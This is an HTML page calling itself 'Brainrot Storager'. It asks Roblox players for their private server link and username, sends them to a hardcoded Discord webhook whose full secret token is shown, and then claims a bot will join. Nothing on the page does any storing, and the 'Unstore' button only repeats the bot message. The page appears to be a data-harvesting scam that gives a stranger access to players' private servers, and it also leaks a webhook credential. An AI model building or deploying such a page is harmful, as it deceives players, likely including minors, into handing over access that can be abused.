<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ðŸ§  Brainrot Storager</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #3e2723; /* Deep chocolate */
      color: #ffc0cb; /* Pink text */
      text-align: center;
      padding: 50px;
    }

    h1 {
      color: #ffc0cb;
    }

    input, button {
      padding: 12px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      width: 300px;
    }

    input {
      background-color: #ffc0cb; /* Pink input */
      color: #3e2723; /* Chocolate text */
    }

    button {
      background-color: #8b4513; /* Chocolate button */
      color: #ffc0cb; /* Pink text */
      cursor: pointer;
      transition: transform 0.2s;
    }

    button:hover {
      transform: scale(1.05);
    }

    .status {
      margin-top: 20px;
      font-size: 18px;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <h1>ðŸ§  Brainrot Storager</h1>
  <div id="form-section">
    <input type="text" id="serverLink" placeholder="Enter Roblox Private Server Link"><br>
    <input type="text" id="username" placeholder="Enter Your Roblox Username"><br>
    <button onclick="storeInfo()">Store</button>
  </div>

  <div id="status-section" class="status" style="display:none;"></div>
  <div id="actions-section" style="display:none;">
    <button onclick="updateInfo()">Update Info</button>
    <button onclick="unstoreInfo()">Unstore</button>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1429933272770678824/HKS-kQ_0jZCMqF3esQW5-aYFhxdMbbMiqIR06RJSGYSUNTE62EA9DF0MMWcC6zI0GDSi";

    window.onload = function() {
      const saved = localStorage.getItem("brainrotData");
      if (saved) {
        const data = JSON.parse(saved);
        document.getElementById("serverLink").value = data.serverLink;
        document.getElementById("username").value = data.username;
        document.getElementById("form-section").style.display = "none";
        document.getElementById("actions-section").style.display = "block";
        document.getElementById("status-section").style.display = "block";
        document.getElementById("status-section").innerText = "âœ… Info stored.\nBot will be joining in 5 minutes or less.\nIf it doesn't work, try again later.";
      }
    };

    function storeInfo() {
      const serverLink = document.getElementById("serverLink").value;
      const username = document.getElementById("username").value;

      if (!serverLink || !username) {
        alert("Please fill out both fields.");
        return;
      }

      const payload = {
        content: `ðŸ§  Brainrot Submission\nðŸ”— Server: ${serverLink}\nðŸ‘¤ User: ${username}`
      };

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).then(() => {
        localStorage.setItem("brainrotData", JSON.stringify({ serverLink, username }));
        document.getElementById("form-section").style.display = "none";
        document.getElementById("actions-section").style.display = "block";
        document.getElementById("status-section").style.display = "block";
        document.getElementById("status-section").innerText = "âœ… Info stored.\nBot will be joining in 5 minutes or less.\nIf it doesn't work, try again later.";
      });
    }

    function updateInfo() {
      localStorage.removeItem("brainrotData");
      document.getElementById("form-section").style.display = "block";
      document.getElementById("actions-section").style.display = "none";
      document.getElementById("status-section").style.display = "none";
    }

    function unstoreInfo() {
      const saved = localStorage.getItem("brainrotData");
      if (saved) {
        document.getElementById("status-section").style.display = "block";
        document.getElementById("status-section").innerText = "ðŸ¤– Bot will be joining within 5 minutes.\nIf it takes longer, try again later.";
      }
    }
  </script>
</body>
</html>
